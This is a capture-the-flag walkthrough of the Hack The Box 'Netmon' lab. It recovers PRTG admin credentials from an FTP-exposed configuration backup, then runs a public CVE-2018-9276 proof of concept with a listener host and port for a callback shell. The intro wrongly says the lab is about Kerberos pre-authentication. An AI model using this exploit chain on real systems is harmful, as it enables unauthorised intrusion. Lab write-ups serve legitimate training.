# Netmon

Netmon is a easy HTB lab that focuses on active directory, disabled kerberos pre-authentication and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

<!-- toc -->

### Recon

The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.
```
$ sudo nmap -p1-10000 --min-rate 1000 -sV 10.129.229.100

Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-27 00:06 BST
Nmap scan report for 10.129.229.100
Host is up (0.37s latency).
Not shown: 9994 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.84 seconds
```

Enumerating the website, we can the software and its version.
```
$ curl http://10.129.229.100/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
...
<p>You are using the Freeware version of <a href='https://www.paessler.com?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>PRTG Network Monitor</a>. We're glad to help you cover all aspects of the current state-of-the-art <a href='https://www.paessler.com/network_monitoring?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>network monitoring!</a>.
<span class="prtgversion">&nbsp;PRTG Network Monitor 18.1.37.13946 </span>
```

From the above request, we got the software name as `PRTG Network Monitor` and version as `18.1.37.13946`. Searching online, we found that https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/. Reading the files on FTP, we get the following file:
```
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
10-26-23  09:53PM              1717102 PRTG Graph Data Cache.dat
```

Read the old bak file as it has diffrent sizes. From the file, we can the old password and update to this 2019 year.

PrTg@dmin2018

The username was prtgadmin and password was PrTg@dmin2019 (NOTE: its 2019 as the file was last modified in 2019)

Searching online, we found that exploit POC - https://github.com/wildkindcc/CVE-2018-9276 and we can use the credentials.

```
$ git clone https://github.com/wildkindcc/CVE-2018-9276.git
$ python CVE-2018-9276.py -h
$ sudo python3 exploit.py -i 10.129.74.116 -p 80 --lhost 10.10.14.106 --lport 4445 --user prtgadmin --password PrTg@dmin2019
```

Getting the flag:
```
cd C:\Users\Administrator\Desktop;
dir;
type root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
